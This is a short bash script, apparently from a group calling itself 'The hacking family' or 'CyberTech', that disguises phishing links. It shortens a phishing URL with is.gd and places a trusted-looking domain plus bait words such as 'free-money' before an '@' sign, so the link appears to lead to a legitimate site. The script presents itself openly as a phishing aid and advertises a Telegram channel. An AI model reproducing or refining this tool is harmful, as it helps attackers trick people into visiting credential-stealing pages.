# Bash Script for Hide Phishing URL Created by The hacking family

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] You fuck up Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo -e "\n\e[1;31;42m######┌──────────────────────────┐##### \e[0m"
echo -e "\e[1;31;82m######CyberTech##### \e[0m"
echo -e "\e[1;31;62m###Coding is fun######\e[0m"
echo -e "\e[42m####CyberPhish######## \e[0m"
echo -e "\e[1;31;42m####Phising to a new level###### \e[0m"
echo -e "\e[1;31;42m######└──────────────────────────┘##### \e[0m \n"
echo -e "\e[40;38;5;82m Please Visit and support our telegram channel and blog \e[30;48;5;82m https://t.me/danmaffiayounghack \e[0m"
echo -e "\e[30;48;5;82m    Copyright \e[40;38;5;82m   CyberTech \e[0m \n\n"
echo -e "\e[1;31;42m ### Phishing URL ###\e[0m \n"
echo -n "Paste Phishing URL here (with http or https): "
read phish
url_checker $phish
sleep 1
echo "Processing and Modifing Phishing URL"
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "\n\e[1;31;42m ### CyberTech Domain ###\e[0m"
echo 'Domain to hide the Phishing URL (with http or https), ex: https://google.com, http
://anything.org) :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nType social engineering words:(like free-money, best-pubg-tricks)'
echo -e "\e[31mDon't use space just use '-' between social engineering words\e[0m"
echo -en "\e[32m=>\e[0m "
read words
if [[ -z "$words" ]]; then
echo -e "\e[31m[!] No words.\e[0m"
echo -e "\nGenerating CyberPhish hidden Link...\n"
final=$mask@$shorter
echo -e "Here is the CyberPhish hidden URL:\e[32m ${final} \e[0m\n"
exit
fi
if [[ "$words" =~ " " ]]; then
echo -e "\e[31m[!] fucked up!! Invalid words. Please avoid using space.\e[0m"
echo -e "\nGenerating CyberPhish Link...\n"
final=$mask@$shorter
echo -e "Here is your CyberPhish URL:\e[32m ${final} \e[0m\n"
exit
fi
echo -e "\nGenerating CyberPhish Link...\n"
final=$mask-$words@$shorter
echo -e "Here is the CyberPhish URL:\e[32m ${final} \e[0m\n"
